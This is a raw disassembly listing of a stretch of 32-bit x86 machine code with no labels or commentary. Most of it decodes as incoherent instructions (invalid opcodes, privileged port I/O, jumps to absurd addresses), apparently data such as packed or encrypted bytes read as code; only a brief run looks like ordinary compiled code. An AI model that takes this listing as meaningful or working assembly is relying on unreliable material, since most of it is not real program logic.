  40cac5:	sub    ebx,ebx
  40cac7:	sahf   
  40cac8:	add    DWORD PTR [edi+0x21],ebx
  40cacb:	jns    0x40ca75
  40cacd:	cli    
  40cace:	sbb    eax,0x41f387f9
  40cad3:	mov    edi,0xe710814d
  40cad8:	(bad)
  40cadb:	scas   eax,DWORD PTR es:[edi]
  40cadc:	fsub   DWORD PTR [eax+esi*4-0x25]
  40cae0:	xor    al,bh
  40cae2:	gs (bad) 
  40cae5:	das    
  40cae6:	xchg   edi,eax
  40cae7:	xchg   edx,eax
  40cae8:	int    0xe9
  40caea:	dec    ecx
  40caeb:	rol    BYTE PTR [eax],1
  40caed:	sbb    dl,BYTE PTR [edi+0x16]
  40caf0:	adc    esi,DWORD PTR [ebp-0x28]
  40caf3:	cmp    al,0x97
  40caf5:	sbb    DWORD PTR [edi+0x1eef6e76],ecx
  40cafb:	pop    edx
  40cafc:	pop    eax
  40cafd:	jae    0x40cb1f
  40caff:	sub    BYTE PTR [ecx+0x4d976265],bh
  40cb05:	xchg   edx,eax
  40cb06:	ins    DWORD PTR es:[edi],dx
  40cb07:	(bad)  
  40cb08:	cmp    esi,DWORD PTR ds:0x207df4d6
  40cb0e:	call   0xec1796d
  40cb13:	jbe    0x40cafc
  40cb15:	int3   
  40cb16:	add    dl,al
  40cb18:	sbb    BYTE PTR [edx-0xa4d49e],al
  40cb1e:	mov    edi,0xeea16687
  40cb23:	aas    
  40cb24:	mov    eax,ds:0xbb30f809
  40cb29:	jmp    0x40cab8
  40cb2b:	pushf  
  40cb2c:	xchg   edi,eax
  40cb2d:	mov    eax,0xd2b6c27e
  40cb32:	pushf  
  40cb33:	and    esi,DWORD PTR ds:0xa5cdf9e0
  40cb39:	addr16 repnz (bad) 
  40cb3d:	stc    
  40cb3e:	gs push esp
  40cb40:	jge    0x40cadd
  40cb42:	rcr    BYTE PTR [ebx-0x69],1
  40cb45:	ret    
  40cb46:	loop   0x40cb28
  40cb48:	in     al,0x1f
  40cb4a:	gs dec edx
  40cb4c:	enter  0xfee5,0x81
  40cb50:	clc    
  40cb51:	out    0xfd,eax
  40cb53:	inc    eax
  40cb54:	hlt    
  40cb55:	inc    eax
  40cb56:	dec    ebp
  40cb57:	mov    ecx,0x48dcf05d
  40cb5c:	fnstenv [esi*2+0x2054c81]
  40cb63:	ret    0xf48d
  40cb66:	es pop ss
  40cb68:	fdivr  QWORD PTR ds:0xfde28f14
  40cb6e:	inc    ebp
  40cb6f:	add    BYTE PTR [edi+0x372889c0],0x2a
  40cb76:	ret    0x5bf7
  40cb79:	push   ds
  40cb7a:	aas    
  40cb7b:	sbb    al,cl
  40cb7d:	aam    0x4d
  40cb7f:	imul   ebx,DWORD PTR [esi+0x17d2a753],0x75
  40cb86:	jae    0x40cbb6
  40cb88:	mov    eax,ds:0x59f292fe
  40cb8d:	hlt    
  40cb8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb8f:	xor    cl,dl
  40cb91:	jmp    0xd8459ed4
  40cb96:	jae    0x40cb6d
  40cb98:	test   eax,0xdf9b1e75
  40cb9d:	adc    BYTE PTR [ebx],cl
  40cb9f:	jmp    0xd85601be
  40cba4:	xchg   ebx,eax
  40cba5:	sbb    BYTE PTR [ecx-0x42],0x7b
  40cba9:	outs   dx,BYTE PTR ds:[esi]
  40cbaa:	jmp    0x6c68:0x2ac6156e
  40cbb1:	pop    edx
  40cbb2:	inc    esp
  40cbb3:	cdq    
  40cbb4:	pusha  
  40cbb5:	and    al,0x67
  40cbb7:	shr    DWORD PTR [ecx],0x38
  40cbba:	sub    DWORD PTR [ecx+0x1],0x3c5719b2
  40cbc1:	xlat   BYTE PTR ds:[ebx]
  40cbc2:	jnp    0x40cbf0
  40cbc4:	fwait
  40cbc5:	inc    eax
  40cbc6:	push   esi
  40cbc7:	pusha  
  40cbc8:	add    al,0xf6
  40cbca:	xchg   ebx,eax
  40cbcb:	sub    DWORD PTR [esi+0x1e37e764],esi
  40cbd1:	dec    ebp
  40cbd2:	test   BYTE PTR [eax+0x37a76934],0x44
  40cbd9:	and    al,0x8
  40cbdb:	(bad)  
  40cbdd:	xor    eax,0xbc164680
  40cbe2:	(bad)  
  40cbe4:	pop    esi
  40cbe5:	imul   esp,DWORD PTR [esi],0x8bdffb8f
  40cbeb:	addr16 call 0xa19f8b63
  40cbf1:	sar    dh,cl
  40cbf3:	pop    es
  40cbf4:	fsubr  QWORD PTR [ecx]
  40cbf6:	fistp  QWORD PTR [edi+ecx*8+0x5a]
  40cbfa:	mov    bh,BYTE PTR [ecx+0x6e75c0cd]
  40cc00:	mov    edi,0x9130cd0d
  40cc05:	cmp    esi,DWORD PTR [eax-0x44]
  40cc08:	jmp    0x40cc0e
  40cc0a:	xor    ebp,DWORD PTR [eax+0x19]
  40cc0d:	shl    BYTE PTR [eax+0x57],1
  40cc10:	gs mov esi,0x83e857ac
  40cc16:	jecxz  0x40cbad
  40cc18:	popf   
  40cc19:	std    
  40cc1a:	bound  esi,QWORD PTR [ebx]
  40cc1c:	or     ebp,ebp
  40cc1e:	push   ebx
  40cc1f:	popa   
  40cc20:	mov    dh,0x93
  40cc22:	cmp    eax,0x13ba3c3c
  40cc27:	(bad)  [edi-0x2c]
  40cc2a:	in     al,dx
  40cc2b:	(bad)  
  40cc2c:	sub    bh,dl
  40cc2e:	jo     0x40cc8d
  40cc30:	lea    edi,[ebp-0x41df0318]
  40cc36:	push   esi
  40cc37:	fimul  WORD PTR [edx]
  40cc39:	rol    ecx,1
  40cc3b:	in     al,dx
  40cc3c:	aad    0x72
  40cc3e:	or     al,0xd4
  40cc40:	leave  
  40cc41:	cmp    al,ch
  40cc43:	pushf  
  40cc44:	outs   dx,DWORD PTR ds:[esi]
  40cc45:	mov    DWORD PTR [ebx-0x2aaa1419],0x3730271d
  40cc4f:	(bad)  
  40cc50:	sbb    al,0xef
  40cc52:	cmc    
  40cc53:	xchg   BYTE PTR [edx],ah
  40cc55:	popa   
  40cc56:	sub    ebx,DWORD PTR [ebx]
  40cc58:	sbb    BYTE PTR [ecx+0x9],ch
  40cc5b:	out    dx,al
  40cc5c:	mov    ds:0x70619da8,eax
  40cc61:	and    ebp,esi
  40cc63:	scas   al,BYTE PTR es:[edi]
  40cc64:	mov    eax,DWORD PTR [esp+ecx*1]
  40cc67:	out    0x4,eax
  40cc69:	dec    edx
  40cc6a:	xor    bh,BYTE PTR [edi]
  40cc6c:	gs fcmovnb st,st(0)
  40cc6f:	imul   esi,DWORD PTR [edi-0x232307d4],0xfffffffd
  40cc76:	mov    bh,bh
  40cc78:	push   ebp
  40cc79:	mov    bh,0x0
  40cc7b:	cmp    DWORD PTR [ecx+0x69],eax
  40cc7e:	leave  
  40cc7f:	jne    0x40cccd
  40cc81:	mov    ah,0x64
  40cc83:	or     al,0xd8
  40cc85:	scas   eax,DWORD PTR es:[edi]
  40cc86:	pop    esi
  40cc87:	(bad)  
  40cc88:	iret   
  40cc89:	fwait
  40cc8a:	pop    ebx
  40cc8b:	sub    BYTE PTR [ebp+0x259fa337],ch
  40cc91:	loop   0x40cc9b
  40cc93:	add    eax,0x4ec1a527
  40cc98:	loop   0x40cc5d
  40cc9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc9b:	js     0x40cc75
  40cc9d:	push   ss
  40cc9e:	sub    BYTE PTR [edx+0x764eea3b],cl
  40cca4:	lods   eax,DWORD PTR ds:[esi]
  40cca5:	mov    cl,0xbf
  40cca8:	fidivr WORD PTR [eax-0x2fd53918]
  40ccae:	mov    bh,BYTE PTR [ebx]
  40ccb0:	push   ss
  40ccb1:	jnp    0x40cd13
  40ccb3:	popa   
  40ccb4:	std    
  40ccb5:	outs   dx,BYTE PTR ds:[esi]
  40ccb6:	dec    ecx
  40ccb7:	adc    eax,0xb7018d14
  40ccbc:	and    al,0xe1
  40ccbe:	in     eax,dx
  40ccbf:	push   ds
  40ccc0:	call   0xeed3:0xd6abecf7
  40ccc7:	inc    eax
  40ccc8:	mov    ds:0xe5adf126,eax
  40cccd:	xchg   BYTE PTR [ebx],al
  40cccf:	call   0x4867:0xa40b57e3
  40ccd6:	pop    esp
  40ccd7:	adc    ch,BYTE PTR [edi*8-0x261b1f6]
  40ccde:	mov    bh,0xe0
  40cce0:	dec    edi
  40cce1:	jae    0x40cd5e
  40cce3:	rcl    DWORD PTR ds:0xf83873d2,1
  40cce9:	lock mov ebp,0xa6780179
  40ccef:	cmp    al,0x94
  40ccf1:	mov    al,0x33
  40ccf3:	add    cl,BYTE PTR ds:0x648348b5
  40ccf9:	jle    0x40cc9f
  40ccfb:	mov    al,0x3d
  40ccfd:	cdq    
  40ccfe:	jnp    0x40cd31
  40cd00:	jnp    0x40ccd9
  40cd02:	nop
  40cd03:	jmp    0x40ccdd
  40cd05:	xor    eax,0x9db39233
  40cd0a:	jmp    0x40cd3c
  40cd0c:	retf   0xdc01
  40cd0f:	neg    DWORD PTR [ebp-0x4b0a1f2f]
  40cd15:	loopne 0x40ccf9
  40cd17:	retf   
  40cd18:	imul   edx,DWORD PTR [esi+0x14],0x67
  40cd1c:	mov    al,ds:0x4d9ca8e0
  40cd21:	push   0x2b96f378
  40cd26:	in     al,0x80
  40cd28:	repnz fnstenv [eax]
  40cd2b:	imul   esi,DWORD PTR [eax],0xffffffb5
  40cd2e:	popa   
  40cd2f:	mov    DWORD PTR [edx+0x17d6bb0b],esp
  40cd35:	ins    DWORD PTR es:[edi],dx
  40cd36:	outs   dx,BYTE PTR ds:[esi]
  40cd37:	adc    al,BYTE PTR [esi-0x1a]
  40cd3a:	fwait
  40cd3b:	(bad)
  40cd3f:	mov    BYTE PTR [edx+0x3],cl
  40cd42:	mov    ecx,0xe3a5f76b
  40cd47:	sub    edi,esp
  40cd49:	mov    cl,0x42
  40cd4b:	rcl    DWORD PTR [ebp+0xa5c9142],cl
  40cd51:	ds dec ecx
  40cd53:	loopne 0x40cd1a
  40cd55:	mov    eax,ds:0x702a868f
  40cd5a:	cld    
  40cd5b:	dec    ebp
  40cd5c:	fldcw  WORD PTR [esi+ebp*4]
  40cd5f:	pop    ecx
  40cd60:	outs   dx,BYTE PTR ds:[esi]
  40cd61:	xchg   DWORD PTR [edi-0x1e],esp
  40cd64:	pop    ebx
  40cd65:	stc    
  40cd66:	jmp    0x40cde4
  40cd68:	out    0x4e,eax
  40cd6a:	jp     0x40cd99
  40cd6c:	rol    DWORD PTR [ebx-0x4da76c3b],1
  40cd72:	in     al,dx
  40cd73:	sub    al,dh
  40cd75:	dec    esi
  40cd76:	test   al,0x46
  40cd78:	aam    0x3c
  40cd7a:	mov    ah,BYTE PTR [eax-0x2dd07878]
  40cd80:	int3   
  40cd81:	loop   0x40cdd9
  40cd83:	or     esp,DWORD PTR [edi+0x14]
  40cd86:	inc    ebp
  40cd87:	aam    0x2e
  40cd89:	inc    edi
  40cd8a:	jo     0x40cdd6
  40cd8c:	jmp    0x9898:0x3e5e7683
  40cd93:	(bad)  
  40cd94:	je     0x40cdb1
  40cd96:	cmp    BYTE PTR [edx+0x70bc3c51],dh
  40cd9c:	xor    al,0x7b
  40cd9e:	xor    dl,BYTE PTR [ebx+0x14692e4d]
  40cda4:	xchg   edi,eax
  40cda5:	dec    ebx
  40cda6:	inc    esp
  40cda7:	push   ecx
  40cda8:	add    ebx,eax
  40cdaa:	mov    al,ds:0xca054793
  40cdaf:	cmc    
  40cdb0:	stos   BYTE PTR es:[edi],al
  40cdb1:	pop    es
  40cdb2:	push   es
  40cdb3:	je     0x40cdfa
  40cdb5:	sbb    esi,DWORD PTR [ebx+edx*1+0x7c]
  40cdb9:	xor    bl,BYTE PTR [eax]
  40cdbb:	dec    esi
  40cdbc:	lahf   
  40cdbd:	pop    esi
  40cdbe:	pop    esi
  40cdbf:	mov    cl,0x94
  40cdc1:	add    al,0xa7
  40cdc3:	cmp    cl,BYTE PTR ds:[esi-0x6a]
  40cdc7:	dec    esi
  40cdc8:	mov    ds:0x8e5c4383,eax
  40cdcd:	(bad)  
  40cdce:	rcl    esi,0x86
  40cdd1:	push   edi
  40cdd2:	popf   
  40cdd3:	or     BYTE PTR [edx+0x32],0x7e
  40cdd7:	(bad)  
  40cdd8:	lods   al,BYTE PTR ds:[esi]
  40cdd9:	inc    esp
  40cdda:	outs   dx,DWORD PTR ds:[esi]
  40cddb:	add    DWORD PTR [ebp-0x2f691e1c],edx
  40cde1:	test   al,0xa
  40cde3:	or     cl,BYTE PTR [ebp+0x2b]
  40cde6:	pop    edi
  40cde7:	mov    bh,dl
  40cde9:	rcr    BYTE PTR [eax-0x18],1
  40cdec:	pop    ss
  40cded:	push   es
  40cdee:	push   ds
  40cdef:	xor    eax,0x4b026288
  40cdf4:	pop    ecx
  40cdf5:	push   esi
  40cdf6:	popf   
  40cdf7:	sbb    edi,edx
  40cdf9:	and    esi,0x50
  40cdfc:	dec    edi
  40cdfd:	cs pop esp
  40cdff:	rcl    DWORD PTR [esp+edx*2],0x27
  40ce03:	jmp    FWORD PTR [esi]
  40ce05:	(bad)  
  40ce06:	push   esi
  40ce07:	pop    es
  40ce08:	mov    edi,0x2dc1956b
  40ce0d:	xchg   esi,eax
  40ce0e:	cmp    eax,0x42cad0b0
  40ce13:	add    al,0xbf
  40ce15:	sub    edi,DWORD PTR [esi-0x65]
  40ce18:	xchg   ebp,eax
  40ce19:	stos   DWORD PTR es:[edi],eax
  40ce1a:	sbb    cl,ch
  40ce1c:	ret    0xa46d
  40ce1f:	pop    edi
  40ce20:	icebp  
  40ce21:	(bad)  [edi]
  40ce23:	inc    ebp
  40ce24:	mov    ds:0xc9e56791,eax
  40ce29:	jns    0x40cdd2
  40ce2b:	mov    gs,WORD PTR [edx-0x6ccae7d1]
  40ce31:	retf   0x2c8a
  40ce34:	shr    esi,0x27
  40ce37:	jmp    0xc38dae87
  40ce3c:	xor    BYTE PTR [edx],0x1
  40ce3f:	cmc    
  40ce40:	mov    esi,0xbff49c01
  40ce45:	add    DWORD PTR [edx],esi
  40ce47:	push   ebp
  40ce48:	sar    DWORD PTR [ebx],cl
  40ce4a:	lods   eax,DWORD PTR ds:[esi]
  40ce4b:	cs jb  0x40ce15
  40ce4e:	stos   BYTE PTR es:[edi],al
  40ce4f:	addr16 mov eax,0x4f522f93
  40ce55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce56:	fnstsw WORD PTR [ecx]
  40ce58:	clc    
  40ce59:	test   DWORD PTR [esi-0x77fed5b7],eax
  40ce5f:	dec    edx
  40ce60:	ins    DWORD PTR es:[edi],dx
  40ce61:	fbstp  TBYTE PTR [edi+ebx*8]
  40ce64:	jecxz  0x40ced1
  40ce66:	(bad)  
  40ce68:	not    DWORD PTR [edi]
  40ce6a:	or     al,0x29
  40ce6c:	jmp    0x40cedd
  40ce6e:	sub    eax,0xdc0e4211
  40ce73:	jge    0x40ceac
  40ce75:	lock pushf 
  40ce77:	inc    esi
  40ce78:	mov    edx,0xac42835b
  40ce7d:	fwait
  40ce7e:	stos   BYTE PTR es:[edi],al
  40ce7f:	mov    bl,0xdb
  40ce81:	or     ebx,DWORD PTR [esp+eiz*8+0x42]
  40ce85:	int3   
  40ce86:	add    eax,0xbe2a78cb
  40ce8b:	fimul  WORD PTR [eax]
  40ce8d:	push   ds
  40ce8e:	sbb    edi,DWORD PTR [edx]
  40ce90:	fwait
  40ce91:	dec    ecx
  40ce92:	mov    es,WORD PTR [ebp-0x71]
  40ce95:	and    cl,BYTE PTR [eax]
  40ce97:	jbe    0x40ce6f
  40ce99:	gs inc eax
  40ce9b:	jne    0x40ce78
  40ce9d:	pop    esp
  40ce9e:	stc    
  40ce9f:	and    BYTE PTR [edx+0x278a5021],dl
  40cea5:	inc    esi
  40cea6:	xor    BYTE PTR [edi],dh
  40cea8:	sahf   
  40cea9:	dec    ebx
  40ceaa:	mov    edx,0x5a77f519
  40ceaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceb0:	(bad)  [eax+0x55ff05ee]
  40ceb6:	mov    edx,0x3720086f
  40cebb:	ja     0x40cf1e
  40cebd:	add    DWORD PTR [edx+0x24],esp
  40cec0:	ror    cl,cl
  40cec2:	imul   ecx,esp,0xffffff81
  40cec5:	mov    dh,0xca
  40cec7:	push   ebp
  40cec8:	inc    ebx
  40cec9:	scas   al,BYTE PTR es:[edi]
  40ceca:	pop    ss
  40cecb:	mov    esi,0xc923a887
  40ced0:	nop
  40ced1:	sub    ebx,eax
  40ced3:	inc    eax
  40ced4:	push   eax
  40ced5:	pusha  
  40ced6:	mov    BYTE PTR [ebp+0x51a65090],ch
  40cedc:	dec    esi
  40cedd:	push   ebp
  40cede:	xor    DWORD PTR [esi-0x76],edi
  40cee1:	inc    edi
  40cee2:	push   esi
  40cee3:	adc    ebp,edx
  40cee5:	popf   
  40cee6:	out    0x38,eax
  40cee8:	xor    bh,bl
  40ceea:	int3   
  40ceeb:	cmp    DWORD PTR [edi+ebp*8+0x19],esi
  40ceef:	adc    ah,BYTE PTR [eax]
  40cef1:	test   BYTE PTR [edx+0x3b],0xde
  40cef5:	(bad)  
  40cef6:	adc    al,0xc5
  40cef8:	shl    BYTE PTR [edi],0xe6
  40cefb:	scas   al,BYTE PTR es:[edi]
  40cefc:	js     0x40cecc
  40cefe:	mov    eax,ds:0xa07b771a
  40cf03:	fdivr  st,st(5)
  40cf05:	shl    BYTE PTR [ebp+0x54],cl
  40cf08:	jae    0x40cf56
  40cf0a:	lea    ebx,[edx]
  40cf0c:	xlat   BYTE PTR ds:[ebx]
  40cf0d:	ret    
  40cf0e:	xchg   ebp,eax
  40cf0f:	imul   edi,DWORD PTR [edx-0x75f0aa51],0xffffffec
  40cf16:	aad    0xb3
  40cf18:	jmp    0x40cf3c
  40cf1a:	out    dx,eax
  40cf1b:	mov    ecx,0xafc948e9
  40cf20:	or     dl,BYTE PTR [ecx]
  40cf22:	pop    esp
  40cf23:	pusha  
  40cf24:	(bad)  
  40cf25:	scas   eax,DWORD PTR es:[edi]
  40cf26:	add    al,0x95
  40cf28:	jg     0x40cf11
  40cf2a:	cmp    bh,BYTE PTR [edi+0x73caa332]
  40cf30:	xor    eax,0x7f23cc47
  40cf35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf36:	nop
  40cf37:	or     ecx,DWORD PTR [edx-0x3cf0f33]
  40cf3d:	and    esi,DWORD PTR [esi+0x40]
  40cf40:	sub    BYTE PTR [edx-0x7e],bh
  40cf43:	add    eax,0xef2deaa5
  40cf48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf4a:	add    al,0x54
  40cf4c:	and    BYTE PTR [ecx+0x21],bl
  40cf4f:	stos   DWORD PTR es:[edi],eax
  40cf50:	mov    ebp,0xfc948ef
  40cf55:	xor    BYTE PTR [edi-0x665025f0],bl
  40cf5b:	test   al,0x2
  40cf5d:	mov    ch,0x45
  40cf5f:	ss mov bh,0x60
  40cf62:	pop    esi
  40cf63:	call   0x5fc8:0x183f849b
  40cf6a:	adc    BYTE PTR [eax-0x65],dl
  40cf6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf6e:	xchg   edx,eax
  40cf6f:	jns    0x40cfbe
  40cf71:	mov    edx,0x19591caa
  40cf76:	inc    edi
  40cf77:	adc    eax,0xd103ce4e
  40cf7c:	xor    edx,ebx
  40cf7e:	mov    ebx,DWORD PTR ds:0x434014
  40cf84:	or     DWORD PTR ds:0x436018,ebx
  40cf8a:	mov    DWORD PTR [ebp-0x50],edx
  40cf8d:	mov    edx,DWORD PTR [ebp+0x8]
  40cf90:	mov    ebx,DWORD PTR ds:0x434020
  40cf96:	sbb    DWORD PTR ds:0x43401c,ebx
  40cf9c:	mov    ebx,DWORD PTR [ebp-0x4c]
  40cf9f:	jmp    0x40f353
  40cfa4:	mov    DWORD PTR [edi+0x2c],0x73f3ac7a
  40cfab:	ret    
  40cfac:	xchg   esp,eax
  40cfad:	cs or  al,0xd2
  40cfb0:	je     0x40cf60
  40cfb2:	add    BYTE PTR [ebx+0x65],dl
  40cfb5:	loop   0x40d033
  40cfb7:	jl     0x40cfa4
  40cfb9:	pop    edi
  40cfba:	jl     0x40d038
  40cfbc:	out    0xf4,al
  40cfbe:	lods   al,BYTE PTR ds:[esi]
  40cfbf:	dec    ebx
  40cfc0:	shr    BYTE PTR [edi-0x4b29ea3f],0x33
  40cfc7:	lea    ebp,[ebp-0x21ea711b]
  40cfcd:	imul   esp,DWORD PTR [esi+0x10],0x467ece78
  40cfd4:	mov    eax,ds:0xa780fddf
  40cfd9:	add    ebp,DWORD PTR [ecx+eax*1]
  40cfdc:	inc    ebp
  40cfdd:	xchg   DWORD PTR [ecx-0x7e7b52af],edx
  40cfe3:	xor    DWORD PTR [eax],eax
  40cfe5:	mov    eax,0x78397fd6
  40cfea:	xchg   ecx,eax
  40cfeb:	push   esi
  40cfec:	push   0x9c984f8e
  40cff1:	cwde   
  40cff2:	jge    0x40d04c
  40cff4:	mov    bl,BYTE PTR [edx+0x60]
  40cff7:	add    cl,BYTE PTR [ebp-0x57]
  40cffa:	xor    eax,0x993afe1
  40cfff:	xchg   ecx,eax
  40d000:	(bad)  
  40d001:	adc    al,0x7
  40d003:	out    0x5d,al
  40d005:	hlt    
  40d006:	aad    0x4f
  40d008:	sahf   
  40d009:	xchg   edi,eax
  40d00a:	adc    eax,0xc0b1dea0
  40d00f:	cli    
  40d010:	ins    DWORD PTR es:[edi],dx
  40d011:	in     eax,0x14
  40d013:	(bad)  
  40d014:	push   0x3f8fd9e8
  40d019:	pop    ds
  40d01a:	rcr    BYTE PTR [ebx],1
  40d01c:	outs   dx,DWORD PTR ds:[esi]
  40d01d:	adc    al,0x80
  40d01f:	jne    0x40cfcd
  40d021:	jle    0x40d06a
  40d023:	mov    al,0x48
  40d025:	dec    esi
  40d026:	ror    BYTE PTR [esi-0x176db8a3],1
  40d02c:	dec    edi
  40d02d:	xchg   esi,eax
  40d02e:	ret    
  40d02f:	xor    BYTE PTR [esi-0x16e6baac],ah
  40d035:	add    al,0x97
  40d037:	mov    esp,0xb7fb6972
  40d03c:	pop    ebx
  40d03d:	addr16 nop
  40d03f:	mov    dh,0x7f
  40d041:	mov    ds:0xb1f55f43,eax
  40d046:	and    DWORD PTR [ecx+0x7a],ebx
  40d049:	dec    ecx
  40d04a:	xchg   ecx,eax
  40d04b:	and    ebx,DWORD PTR [esi-0x351eb9f5]
  40d051:	std    
  40d052:	mov    fs,WORD PTR [esi-0x22fd6394]
  40d058:	xchg   esi,eax
  40d059:	adc    DWORD PTR [ebp+ecx*4+0x76],ecx
  40d05d:	out    0xd7,eax
  40d05f:	or     DWORD PTR [edx],ecx
  40d061:	shr    dh,0xa4
  40d064:	fs pop esi
  40d066:	mov    eax,ds:0x2f72849e
  40d06b:	(bad)  
  40d06c:	clc    
  40d06d:	cli    
  40d06e:	mov    ds:0x9380e542,al
  40d073:	mov    bh,0xdc
  40d075:	sbb    eax,0x465fdb92
  40d07a:	test   eax,0x4a9f419e
  40d07f:	add    eax,esi
  40d081:	rcr    ah,0xca
  40d084:	push   ecx
  40d085:	mov    esp,0x6b31dda3
  40d08a:	mov    edx,0xe103be33
  40d08f:	jl     0x40d09d
  40d091:	add    DWORD PTR [esi+0x5f68f2a3],edx
  40d097:	imul   ebp,DWORD PTR [esi-0x67],0xffffffc5
  40d09b:	jg     0x40d0e8
  40d09d:	test   esp,0xef3b6d60
  40d0a3:	imul   DWORD PTR ds:0xdd3dd3af
  40d0a9:	xor    dl,BYTE PTR cs:0xda76a16f
  40d0b0:	out    dx,eax
  40d0b1:	jbe    0x40d107
  40d0b3:	xchg   esp,eax
  40d0b4:	enter  0x9bf3,0x17
  40d0b8:	inc    esp
  40d0b9:	mov    eax,0xe97c8ebc
  40d0be:	nop
  40d0bf:	sub    al,0xd
  40d0c1:	mov    ecx,0x560f1da9
  40d0c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0c7:	sub    BYTE PTR [edi+0x1d],0xd7
  40d0cb:	sti    
  40d0cc:	das    
  40d0cd:	rcl    bh,cl
  40d0cf:	mov    edi,0xdea3fb28
  40d0d4:	test   BYTE PTR [edx+0xa99511c],al
  40d0da:	add    BYTE PTR [edi+0x54],ah
  40d0dd:	sbb    al,0x31
  40d0df:	mov    edx,0x605defb
  40d0e4:	mov    eax,ds:0xd04edec7
  40d0e9:	mov    edx,0xc4628058
  40d0ee:	popf   
  40d0ef:	rcl    BYTE PTR [ecx+0x14d09b1e],cl
  40d0f5:	mov    bl,0x79
  40d0f7:	sar    BYTE PTR [eax],1
  40d0f9:	sub    esp,edx
  40d0fb:	sub    bl,dl
  40d0fd:	aaa    
  40d0fe:	cmp    al,0xf6
  40d100:	data16 icebp 
  40d102:	fnstcw WORD PTR [ebp+0x6c]
  40d105:	loop   0x40d090
  40d107:	mov    DWORD PTR [ecx+0x34],esp
  40d10a:	std    
  40d10b:	cmc    
  40d10c:	gs and eax,0x93429d36
  40d112:	mov    esi,0xb87dc3ad
  40d117:	mov    eax,fs
  40d119:	inc    ecx
  40d11a:	imul   esp,DWORD PTR [edi],0xcd566b06
  40d120:	mul    edi
  40d122:	fst    DWORD PTR [ebp+0x38ccdfb1]
  40d128:	sti    
  40d129:	aaa    
  40d12a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d12b:	xchg   ebx,eax
  40d12c:	mov    bh,dl
  40d12e:	xchg   ebx,eax
  40d12f:	fwait
  40d130:	mov    eax,0x22e5d0ba
  40d135:	gs fs jp 0x40d0dc
  40d139:	sub    ah,BYTE PTR [ebx-0x282c969f]
  40d13f:	sbb    DWORD PTR [edi-0x72c8ec3],eax
  40d145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d146:	push   ss
  40d147:	and    DWORD PTR [edx+esi*4-0x2],0xffffffc8
  40d14c:	inc    ebp
  40d14d:	and    DWORD PTR [edi-0x1a],edx
  40d150:	iret   
  40d151:	out    0xcc,eax
  40d153:	in     eax,0xde
  40d155:	in     al,0x6a
  40d157:	mov    cl,0x61
  40d159:	mov    BYTE PTR [eax-0x72],ch
  40d15c:	and    cl,BYTE PTR [edi+0x6c]
  40d15f:	out    0x78,al
  40d161:	loope  0x40d162
  40d163:	pop    edx
  40d164:	xor    bh,BYTE PTR [edx+0x7c255ee5]
  40d16a:	arpl   WORD PTR [ebp+eax*1+0x15ece40e],sp
  40d171:	push   edi
  40d172:	mov    esp,0xae3ca228
  40d177:	stc    
  40d178:	or     ecx,eax
  40d17a:	xor    ebx,edx
  40d17c:	dec    esi
  40d17d:	mov    ebp,DWORD PTR [ecx]
  40d17f:	mov    cl,0x0
  40d181:	sub    bl,BYTE PTR [eax]
  40d183:	xchg   edx,eax
  40d184:	loop   0x40d1a2
  40d186:	ror    ebp,0xf2
  40d189:	jp     0x40d132
  40d18b:	outs   dx,BYTE PTR ds:[esi]
  40d18c:	pop    eax
  40d18d:	mov    ch,0xd9
  40d18f:	sub    eax,0x6c2bf76c
  40d194:	daa    
  40d195:	imul   ebp,DWORD PTR ds:0x8c6436a8,0xb3fa214f
  40d19f:	fmul   st(1),st
  40d1a1:	jle    0x40d1c8
  40d1a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1a4:	rcl    bh,0xa8
  40d1a7:	int    0x66
  40d1a9:	dec    edi
  40d1aa:	add    eax,0x74dba0dc
  40d1af:	sub    al,0xcd
  40d1b1:	xchg   ebx,eax
  40d1b2:	add    dh,BYTE PTR [ebx+0x30]
  40d1b5:	(bad)  
  40d1b6:	nop
  40d1b7:	cld    
  40d1b8:	scas   eax,DWORD PTR es:[edi]
  40d1b9:	pop    esi
  40d1ba:	cld    
  40d1bb:	sbb    DWORD PTR es:[esi-0x29],esi
  40d1bf:	pop    eax
  40d1c0:	mov    cl,0xae
  40d1c2:	jbe    0x40d181
  40d1c4:	imul   ebx,DWORD PTR [eax],0xffffffc8
  40d1c7:	lds    esp,FWORD PTR [edx+0x4edaf511]
  40d1cd:	gs stos DWORD PTR es:[edi],eax
  40d1cf:	inc    esi
  40d1d0:	cmp    esi,DWORD PTR [ebp*8+0x672eb0c6]
  40d1d7:	pop    ecx
  40d1d8:	int3   
  40d1d9:	sbb    DWORD PTR [ebp+0x73245488],0xffffffde
  40d1e0:	(bad)  
  40d1e1:	jecxz  0x40d1c8
  40d1e3:	cwde   
  40d1e4:	into   
  40d1e5:	cmp    eax,0x9fefb42a
  40d1ea:	sub    DWORD PTR [ecx],esi
  40d1ec:	push   edx
  40d1ed:	test   BYTE PTR [ecx],dh
  40d1ef:	push   cs
  40d1f0:	xchg   esp,eax
  40d1f1:	shl    BYTE PTR [ecx],cl
  40d1f3:	ins    DWORD PTR es:[edi],dx
  40d1f4:	sbb    bl,0x67
  40d1f7:	mov    ebx,DWORD PTR [esi+0x24c4a86]
  40d1fd:	cmc    
  40d1fe:	ror    ebp,1
  40d200:	xchg   DWORD PTR [ebp+ecx*2-0x73],edi
  40d204:	(bad)  
  40d205:	leave  
  40d206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d207:	jl     0x40d242
  40d209:	clc    
  40d20a:	adc    eax,0x8d7bac77
  40d20f:	sub    BYTE PTR [ecx-0x7b],ah
  40d212:	adc    eax,0x2ab6762c
  40d217:	(bad)  
  40d218:	call   0x5c7f:0x3391e68a
  40d21f:	xchg   ecx,eax
  40d220:	out    0xaa,eax
  40d222:	je     0x40d21a
  40d224:	aam    0xf2
  40d226:	lock rol esp,0xf2
  40d22a:	dec    edi
  40d22b:	jmp    0x40d233
